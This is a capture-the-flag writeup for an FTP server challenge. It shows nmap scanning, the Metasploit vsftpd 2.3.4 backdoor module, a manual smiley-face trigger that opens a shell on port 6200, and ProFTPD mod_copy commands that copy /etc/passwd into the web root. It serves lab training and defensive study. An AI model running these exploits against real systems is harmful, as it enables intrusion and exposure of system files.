# Maq128: Servidor FTP

Writeup for the **Servidor FTP** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 128

---

## Overview

An FTP server running a vulnerable version of vsftpd or ProFTPD. Exploitation leads to remote code execution or unauthorized file access.

## Reconnaissance

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
```

Identify the FTP service version on port 21. Common vulnerable versions include vsftpd 2.3.4 (backdoor) and ProFTPD 1.3.3c (mod_copy).

```bash
nmap -sV -p 21 --script ftp-anon,ftp-syst [TARGET_IP]
```

Check for anonymous login:

```bash
ftp [TARGET_IP]
# Try: anonymous / anonymous
```

## Exploitation

**vsftpd 2.3.4 Backdoor:**

```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS [TARGET_IP]
run
```

**ProFTPD mod_copy (if applicable):**

```bash
nc [TARGET_IP] 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
```

Then access the copied file via HTTP.

**Manual vsftpd trigger:**

```bash
telnet [TARGET_IP] 21
USER backdoor:)
PASS anything
```

Then connect to the backdoor shell on port 6200.

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Exploit Public-Facing Application | T1190 |
| Lateral Tool Transfer | T1570 |

### CWE

- **CWE-912:** Hidden Functionality (vsftpd backdoor)
- **CWE-284:** Improper Access Control (mod_copy)

---

FTP may feel like a relic from a simpler time, but its vulnerabilities are still very much alive. A smiley face in a username field should never open a root shell.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
